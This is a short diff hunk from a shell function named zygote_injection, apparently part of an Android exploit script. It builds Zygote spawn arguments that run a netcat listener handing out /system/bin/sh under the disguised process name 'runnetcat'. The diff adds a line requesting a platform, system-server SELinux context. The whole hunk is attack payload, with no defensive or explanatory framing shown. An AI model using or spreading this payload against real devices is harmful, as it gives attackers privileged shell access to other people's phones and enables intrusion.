@@ -114,6 +114,7 @@ zygote_injection() {
 --target-sdk-version=29
 --setgroups=3003
 --nice-name=runnetcat
+--seinfo=platform:isSystemServer:privapp:targetSdkVersion=28:complete
 --invoke-with
 toybox nc -s 127.0.0.1 -p %s -L /system/bin/sh -l;
 --instruction-set=arm
